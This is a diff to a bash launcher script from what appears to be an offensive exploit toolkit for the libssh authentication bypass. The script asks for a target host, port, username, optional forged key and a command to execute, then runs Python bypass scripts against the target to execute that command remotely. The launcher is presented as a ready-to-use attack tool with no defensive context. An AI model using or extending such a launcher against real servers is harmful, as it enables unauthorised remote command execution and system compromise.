@@ -18,9 +18,27 @@ $RESET"
 echo -e "[$RED 1.check libssh version $RESET]"
 echo -e "[$RED libssh vulnerablility impact version $RESET]"
 echo -e "[$RED 0.7.5 0.6.* or lower $RESET]"
-read -p 'please input your libssh host ip :' CHECK_IP
-read -p 'please input your libssh port : ' CHECK_PORT
-$PYTHON checkversionofserver.py --host $CHECK_IP --port $CHECK_PORT
+read -p 'do you check libssh version?(y/n):' CHECK_V
+case $CHECK_V in
+y)echo
+  read -p 'please input your libssh host ip :' CHECK_IP
+  read -p 'please input your libssh port : ' CHECK_PORT
+  $PYTHON web/cve/cvelibssh/checkversionofserver.py --host $CHECK_IP --port $CHECK_PORT
+  ;;
+n)echo
+  echo -e "$GREEN 略     略     略 $RESET"
+echo -e "$RED
+__________________________
+       |    |    |
+       |    |    |
+       |    |    |
+       |    |    |
+       |         |
+        \_______/
+
+$RESET"
+  ;;
+esac
 echo -e "[$GREEN 2.libssh authentication bypass $RESET]"
 read -p 'do you have a forged key(yes/no) : ' IF_KEY
   if [ "$IF_KEY" = "yes" ]
@@ -30,12 +48,11 @@ read -p 'do you have a forged key(yes/no) : ' IF_KEY
 	    read -p 'please input your libssh username : ' FORGED_USER
 	    read -p 'please input your libssh key : ' FORGED_KEY
 	    read -p 'please input your want to executive order : ' FORGED_COMMAND
-	    $PYTHON bypasswithfakekey.py --host $FORGED_IP -p $FORGED_PORT -u $FORGED_USER -k $FORGED_KEY -c $FORGED_COMMAND
-    elif [ "$IF_KEY" = "no" ]
-    then
+	    $PYTHON web/cve/cvelibssh/bypasswithfakekey.py --host $FORGED_IP -p $FORGED_PORT -u $FORGED_USER -k $FORGED_KEY -c $FORGED_COMMAND
+    else
 	    read -p 'please input your libssh host ip : ' LIBSSH_IP
 	    read -p 'please input your libssh port : ' LIBSSH_PORT
 	    read -p 'please input your want to executive order : ' LIBSSH_COMMAND
-	    $PYTHON libsshauthbypass.py --host $LIBSSH_IP -p $LIBSSH_PORT -c $LIBSSH_COMMAND
-    fi
+	    $PYTHON web/cve/cvelibssh/libsshauthbypass.py --host $LIBSSH_IP -p $LIBSSH_PORT -c $LIBSSH_COMMAND
+ fi
 $BASH cve-exploit.sh
